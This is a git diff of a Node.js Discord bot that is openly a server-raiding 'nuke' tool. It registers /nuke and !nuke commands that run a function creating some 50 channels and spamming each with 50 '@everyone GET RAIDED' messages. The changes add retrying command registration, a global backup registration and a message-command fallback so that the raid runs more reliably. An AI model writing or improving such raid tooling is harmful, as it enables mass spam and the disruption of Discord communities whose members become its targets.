@@ -2,7 +2,7 @@ require('dotenv').config();
 const express = require('express');
 const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, REST, Routes } = require('discord.js');
 
-// ---- EXPRESS WEB SERVER (keeps Render alive) ----
+// ---- EXPRESS WEB SERVER ----
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -22,13 +22,8 @@ app.get('/', (req, res) => {
   `);
 });
 
-app.get('/ping', (req, res) => {
-  res.send('pong');
-});
-
-app.listen(PORT, () => {
-  console.log(`🌐 Web server running on port ${PORT}`);
-});
+app.get('/ping', (req, res) => res.send('pong'));
+app.listen(PORT, () => console.log(`🌐 Web server on port ${PORT}`));
 
 // ---- DISCORD BOT ----
 const client = new Client({
@@ -49,30 +44,73 @@ const CHANNEL_COUNT = 50;
 const MESSAGES_PER_CHANNEL = 50;
 const SPAM_TEXT = '@everyone 🔥 GET RAIDED BY {username} - THIS SERVER IS OURS 🔥 @everyone';
 
-client.once('ready', async () => {
-  console.log(`🔥 ${client.user.tag} online.`);
+// ---- REGISTER COMMANDS WITH RETRY ----
+async function registerCommands() {
   const rest = new REST({ version: '10' }).setToken(TOKEN);
   const commands = [{
     name: 'nuke',
     description: '💀 Full server nuke + spam (Admin)',
     default_member_permissions: PermissionsBitField.Flags.Administrator.toString()
   }];
-  try {
-    if (GUILD_ID) {
-      await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
-    } else {
-      await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
+
+  let success = false;
+  let attempts = 0;
+
+  while (!success && attempts < 5) {
+    attempts++;
+    try {
+      console.log(`📡 Registering commands (attempt ${attempts}/5)...`);
+
+      if (GUILD_ID) {
+        // Guild-specific (instant)
+        await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
+        console.log(`✅ Guild commands registered in ${GUILD_ID}`);
+      } else {
+        // Global (may take 5-10 min)
+        await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
+        console.log('✅ Global commands registered (may take 5-10 min to appear)');
+      }
+
+      // Also register as fallback in the other scope
+      if (GUILD_ID) {
+        // Also push to global as backup
+        try {
+          await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
+          console.log('✅ Also registered globally as backup');
+        } catch (_) {}
+      }
+
+      success = true;
+    } catch (err) {
+      console.error(`❌ Registration attempt ${attempts} failed:`, err.message);
+      if (attempts < 5) {
+        console.log(`⏳ Waiting 3 seconds before retry...`);
+        await sleep(3000);
+      }
     }
-    console.log('✅ Slash command registered.');
-  } catch (e) { console.error('Register failed:', e); }
+  }
+
+  if (!success) {
+    console.log('⚠️ Slash command registration failed. Use !nuke (message command) instead.');
+  }
+}
+
+client.once('ready', async () => {
+  console.log(`🔥 ${client.user.tag} online.`);
+  await registerCommands();
+  console.log(`✅ Bot ready. Use !nuke or /nuke`);
 });
 
+// ---- SLASH COMMAND HANDLER ----
 client.on('interactionCreate', async interaction => {
-  if (!interaction.isChatInputCommand() || interaction.commandName !== 'nuke') return;
-  await interaction.deferReply({ ephemeral: true });
-  await executeNuke(interaction);
+  if (!interaction.isChatInputCommand()) return;
+  if (interaction.commandName === 'nuke') {
+    await interaction.deferReply({ ephemeral: true });
+    await executeNuke(interaction);
+  }
 });
 
+// ---- MESSAGE COMMAND HANDLER (ALWAYS WORKS) ----
 client.on('messageCreate', async msg => {
   if (msg.author.bot || !msg.guild || msg.content !== '!nuke') return;
   if (!msg.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
@@ -81,6 +119,7 @@ client.on('messageCreate', async msg => {
   await executeNuke(msg);
 });
 
+// ---- NUKE FUNCTION (SAME FOR BOTH) ----
 async function executeNuke(ctx) {
   const guild = ctx.guild;
   const author = ctx.member || ctx.author;
@@ -179,7 +218,7 @@ async function executeNuke(ctx) {
     }
   }
 
-  // ---- SPAM 50 MSGS PER CHANNEL (webhooks) ----
+  // ---- SPAM 50 MSGS PER CHANNEL ----
   console.log(`📨 Spamming ${MESSAGES_PER_CHANNEL} msgs in ${channels.length} channels...`);
   let totalSent = 0;
   for (let chIdx = 0; chIdx < channels.length; chIdx++) {
